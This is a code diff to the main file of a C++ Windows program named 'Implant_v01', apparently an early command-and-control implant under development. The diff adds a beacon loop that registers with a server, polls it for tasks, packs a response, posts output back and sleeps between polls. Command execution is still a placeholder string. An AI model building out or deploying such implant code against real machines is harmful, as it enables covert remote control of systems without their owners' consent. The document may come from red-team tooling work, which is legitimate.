@@ -30,31 +30,55 @@
  */
 
 #include <iostream>
-
+#include <windows.h>
 #include "Implant_v01.h"
 #include "tests/test.h"
 #include "lifecycle/register.h"
 #include "lifecycle/comms.h"
+#include "data/msgpack/msgpack.h"
 
 int temp_loop() {
     //note - do a while not registered?
-    std::string implant_uuid = register_implant(); // should return id or set it in settings, etc. 
+    std::string implant_uuid = register_implant();
+
+    if (implant_uuid.empty()) {
+        std::cerr << "Failed to register implant. Exiting." << std::endl;
+        return -1;
+    }
 
     while (1) {
-        //HTTP_GET
-        //placeholder id
-        get(implant_uuid);
+        nlohmann::json task_data = get(implant_uuid);
+        std::cout << "AFTER GET" << std::endl;
 
-        //ACTIONS
+        // [SAFETY CHECK] 
+        // 1. Is the JSON valid (not null)?
+        // 2. Does it contain the task_uuid key?
+        // 3. Is the value actually a string?
+        if (!task_data.is_null() && task_data.contains("task_uuid") && task_data["task_uuid"].is_string())
+        {
+            std::string task_uuid = task_data["task_uuid"];
+            std::cout << "Received Task: " << task_uuid << std::endl;
 
-        //HTTP_POST < next
+            // Execute Actions
+            std::string text_data = "output from command execution";
 
-        //SLEEP
-        return 0;
+            // Prepare Response
+            std::vector<uint8_t> task_response_as_msgpack;
+            create_task_response(implant_uuid, task_uuid, text_data, task_response_as_msgpack);
 
+            // POST Response
+            post(implant_uuid, text_data); // Note: verify if post needs text_data or the msgpack buffer
+        }
+        else {
+            // This handles cases where:
+            // 1. HTTP_GET failed
+            // 2. Server sent "No Content"
+            std::cout << "No task or failed request. Sleeping..." << std::endl;
+        }
+
+        Sleep(5000);
     }
 }
-
 
 int main()
 {
